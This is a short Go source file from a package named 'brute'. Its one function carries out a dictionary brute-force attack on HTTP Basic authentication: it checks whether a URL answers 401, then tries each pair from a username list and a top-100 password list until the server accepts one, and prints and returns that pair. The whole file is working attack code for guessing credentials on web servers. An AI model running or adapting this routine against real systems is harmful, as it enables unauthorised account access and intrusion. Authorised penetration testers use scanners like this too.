package brute

import "fmt"

func Basic_brute(url string) (username string, password string) {
	if req, err := httpRequsetBasic("asdasdascsacacs", "adcadcadcadcadcadc", url, "HEAD", ""); err == nil {
		if req.StatusCode == 401 {
			for useri := range usernames {
				for passi := range top100pass {
					if req2, err2 := httpRequsetBasic(usernames[useri], top100pass[passi], url, "HEAD", ""); err2 == nil {
						if req2.StatusCode == 200 || req2.StatusCode == 403 {
							fmt.Printf("basic-brute-sucess|%s:%s|%s\n", usernames[useri], top100pass[passi], url)
							return usernames[useri], top100pass[passi]
						}
					}
				}
			}
		}
	}
	return "", ""
}
